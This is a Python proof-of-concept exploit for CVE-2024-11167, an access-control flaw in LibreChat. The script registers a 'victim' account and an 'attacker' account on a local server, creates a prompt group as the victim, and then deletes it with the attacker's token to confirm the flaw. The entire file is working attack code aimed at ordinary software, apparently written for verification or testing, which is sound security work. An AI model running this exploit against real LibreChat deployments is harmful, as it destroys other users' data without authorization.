#!/usr/bin/env python3
"""
CVE-2024-11167 - LibreChat IDOR Vulnerability PoC
Allows authenticated users to delete other users' prompt groups
"""
import requests
import sys
import json
import time

BASE_URL = "http://localhost:3080"

def register_user(email, password, name):
    url = f"{BASE_URL}/api/auth/register"
    data = {
        "email": email,
        "password": password,
        "confirm_password": password,
        "name": name
    }
    resp = requests.post(url, json=data)
    return resp.status_code == 200

def login(email, password):
    url = f"{BASE_URL}/api/auth/login"
    data = {"email": email, "password": password}
    resp = requests.post(url, json=data)
    if resp.status_code == 200:
        return resp.json().get("token")
    return None

def create_prompt_group(token, name, prompt_text):
    url = f"{BASE_URL}/api/prompts"
    headers = {"Authorization": f"Bearer {token}"}
    data = {
        "prompt": {"prompt": prompt_text},
        "group": {"name": name, "oneliner": "test"}
    }
    resp = requests.post(url, json=data, headers=headers)
    if resp.status_code == 200:
        return resp.json()
    return None

def get_prompt_groups(token):
    url = f"{BASE_URL}/api/prompts/groups"
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.get(url, headers=headers)
    if resp.status_code == 200:
        return resp.json()
    return None

def delete_prompt_group(token, group_id):
    url = f"{BASE_URL}/api/prompts/groups/{group_id}"
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.delete(url, headers=headers)
    return resp.status_code, resp.text

def main():
    print("[*] CVE-2024-11167 - LibreChat IDOR PoC")
    print("[*] Testing improper access control in prompt group deletion")
    print()
    
    victim_email = "victim@test.com"
    victim_password = "VictimPass123!"
    victim_name = "Victim User"
    
    attacker_email = "attacker@test.com"
    attacker_password = "AttackerPass123!"
    attacker_name = "Attacker User"
    
    print("[1] Registering victim user...")
    if not register_user(victim_email, victim_password, victim_name):
        print("[-] Victim might already exist, trying to login")
    
    victim_token = login(victim_email, victim_password)
    if not victim_token:
        print("[-] Failed to login as victim")
        sys.exit(1)
    print(f"[+] Victim logged in successfully")
    
    print("[2] Registering attacker user...")
    if not register_user(attacker_email, attacker_password, attacker_name):
        print("[-] Attacker might already exist, trying to login")
    
    attacker_token = login(attacker_email, attacker_password)
    if not attacker_token:
        print("[-] Failed to login as attacker")
        sys.exit(1)
    print(f"[+] Attacker logged in successfully")
    
    print("[3] Creating prompt group as victim...")
    result = create_prompt_group(victim_token, "Victim Secret Prompt", "This is a secret prompt")
    if not result:
        print("[-] Failed to create prompt group")
        sys.exit(1)
    
    group_id = result.get("group", {}).get("_id")
    if not group_id:
        print("[-] Could not get group ID")
        print(f"    Response: {result}")
        sys.exit(1)
    print(f"[+] Victim's prompt group created with ID: {group_id}")
    
    print("[4] Verifying victim can see their prompt group...")
    groups = get_prompt_groups(victim_token)
    victim_group_exists = any(g.get("_id") == group_id for g in groups.get("promptGroups", []))
    if victim_group_exists:
        print("[+] Victim can see their prompt group")
    else:
        print("[-] Victim cannot see their prompt group")
        sys.exit(1)
    
    print("[5] Attacker attempting to delete victim's prompt group...")
    print(f"    DELETE /api/prompts/groups/{group_id}")
    status, response = delete_prompt_group(attacker_token, group_id)
    print(f"    Status: {status}, Response: {response}")
    
    print("[6] Checking if victim's prompt group still exists...")
    time.sleep(1)
    groups = get_prompt_groups(victim_token)
    victim_group_exists = any(g.get("_id") == group_id for g in groups.get("promptGroups", []))
    
    print()
    if not victim_group_exists:
        print("[!] VULNERABILITY CONFIRMED!")
        print("[!] Attacker successfully deleted victim's prompt group")
        print("[!] This is CVE-2024-11167 - Improper Access Control")
        return True
    else:
        print("[-] Vulnerability not confirmed - prompt group still exists")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
